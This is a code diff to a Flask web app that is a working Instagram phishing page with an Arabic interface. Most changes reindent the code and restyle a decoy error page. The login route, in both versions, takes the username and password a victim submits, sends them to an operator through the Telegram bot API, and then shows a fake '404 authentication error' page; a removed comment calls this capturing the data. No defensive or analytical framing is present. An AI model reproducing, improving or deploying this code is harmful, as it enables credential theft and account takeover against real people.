@@ -9,40 +9,29 @@ app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
-
 @app.route("/", methods=["GET", "POST"])
 def login():
-  error = ""
-  username_val = ""
-  if request.method == "POST":
-    username_val = request.form.get("username", "").strip()
-    password = request.form.get("password", "")
+    error = ""
+    username_val = ""
+    if request.method == "POST":
+        username_val = request.form.get("username", "").strip()
+        password = request.form.get("password", "")
 
-    username_pattern = r"^[a-zA-Z0-9_\.]{4,30}$"
+        username_pattern = r"^[a-zA-Z0-9_\.]{4,30}$"
 
-    if not re.match(username_pattern, username_val):
-      error = (
-          "عذراً، اسم المستخدم الذي أَدخلته لا ينتمي إلى أي حساب. يُرجى التحقق من"
-          " اسم المستخدم ومحاولة مرة أخرى."
-      )
-    elif len(password) <= 5:
-      error = (
-          "كلمة المرور غير صحيحة. يُرجى التحقق من كلمة المرور مرة أخرى."
-      )
-    else:
-      if BOT_TOKEN and CHAT_ID:
-        msg = (
-            "📸 تم استلام بيانات Instagram جديدة:\n\n👤 الحساب:"
-            f" {username_val}\n🔑 الباسورد: {password}"
-        )
-        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
+        if not re.match(username_pattern, username_val):
+            error = "عذراً، اسم المستخدم الذي أَدخلته لا ينتمي إلى أي حساب. يُرجى التحقق من اسم المستخدم ومحاولة مرة أخرى."
+        elif len(password) <= 5:
+            error = "كلمة المرور غير صحيحة. يُرجى التحقق من كلمة المرور مرة أخرى."
+        else:
+            if BOT_TOKEN and CHAT_ID:
+                msg = f"📸 تم استلام بيانات Instagram جديدة:\n\n👤 الحساب: {username_val}\n🔑 الباسورد: {password}"
+                telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
+            
+            return redirect(url_for("error_page"))
 
-      # التوجيه إلى صفحة الخطأ بعد نجاح التقاط البيانات
-      return redirect(url_for("error_page"))
-
-  return render_template_string(
-      """
+    return render_template_string("""
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -121,15 +110,11 @@ def login():
     </div>
 </body>
 </html>
-""",
-      error=error,
-      username_val=username_val,
-  )
-
+""", error=error, username_val=username_val)
 
 @app.route("/error")
 def error_page():
-  return render_template_string("""
+    return render_template_string("""
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -139,44 +124,40 @@ def error_page():
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body { 
-            background: #121212; 
-            color: #f5f5f5;
+            background: #fdfbf7; 
+            color: #000000;
             height: 100dvh;
             display: flex; 
             flex-direction: column;
             align-items: center; 
             justify-content: center;
-            padding: 20px;
+            padding: 30px;
             text-align: center;
         }
-        .error-card {
+        .error-container {
             width: 100%;
-            max-width: 350px;
-            background: #1c1c1c;
-            border: 1px solid #262626;
-            border-radius: 12px;
-            padding: 30px 20px;
+            max-width: 380px;
             display: flex;
             flex-direction: column;
             align-items: center;
         }
         .error-code {
-            font-size: 48px;
-            font-weight: 700;
-            color: #ed4956;
-            margin-bottom: 10px;
+            font-size: 56px;
+            font-weight: 800;
+            color: #000000;
+            margin-bottom: 15px;
         }
         .error-title {
-            font-size: 16px;
-            font-weight: 600;
+            font-size: 18px;
+            font-weight: 700;
             margin-bottom: 15px;
-            color: #fff;
+            color: #000000;
         }
         .error-desc {
-            font-size: 14px;
-            color: #a8a8a8;
-            line-height: 22px;
-            margin-bottom: 25px;
+            font-size: 15px;
+            color: #222222;
+            line-height: 24px;
+            margin-bottom: 30px;
         }
         .retry-btn {
             width: 100%;
@@ -184,8 +165,8 @@ def error_page():
             color: white;
             border: none;
             border-radius: 8px;
-            padding: 12px;
-            font-size: 14px;
+            padding: 14px;
+            font-size: 15px;
             font-weight: 600;
             cursor: pointer;
             text-decoration: none;
@@ -195,7 +176,7 @@ def error_page():
     </style>
 </head>
 <body>
-    <div class="error-card">
+    <div class="error-container">
         <div class="error-code">404</div>
         <div class="error-title">خطأ في مصادقة الحساب</div>
         <div class="error-desc">
@@ -207,6 +188,5 @@ def error_page():
 </html>
 """)
 
-
 if __name__ == "__main__":
-  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
